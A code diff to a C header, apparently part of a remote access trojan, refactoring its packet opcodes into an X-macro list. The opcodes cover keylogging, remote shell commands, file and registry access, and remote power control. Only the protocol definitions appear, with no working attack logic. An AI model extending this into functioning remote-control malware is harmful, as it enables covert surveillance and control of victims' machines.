@@ -4,20 +4,25 @@
 
 #define SIZE_OF_RAT_PACKET_DATA(p) (sizeof(p) - sizeof(ratpacket_t))
 
+#define FOREACH_RAT_OPCODE                                                     \
+  _(ECHO, 0, "Echo")                                                           \
+  _(REGISTER_CLIENT, 1, "Register_client")                                     \
+  _(UNREGISTER, 2, "Unregister")                                               \
+  _(CONNECT_CLIENT, 3, "Connect_client")                                       \
+  _(DISCONNECT, 4, "Disconnect")                                               \
+  _(KEYLOG, 5, "Keylog")                                                       \
+  _(TURN_OFF, 6, "Turn_off")                                                   \
+  _(TURN_ON, 7, "Turn_on")                                                     \
+  _(RESTART, 8, "Restart")                                                     \
+  _(FILE, 9, "File")                                                           \
+  _(REGISTRY, 10, "Registry")                                                  \
+  _(CMD, 11, "Cmd")                                                            \
+  _(ALERT, 12, "Alert")
+
 typedef enum {
-  echo,
-  register_client,
-  unregister,
-  connect_client,
-  disconnect,
-  keylog,
-  turn_off,
-  turn_on,
-  restart,
-  file,
-  registry,
-  cmd,
-  alert
+#define _(s, v, n) RAT_PACKET_##s = (v),
+  FOREACH_RAT_OPCODE
+#undef _
 } op_codes;
 
 typedef struct __attribute__((packed)) {
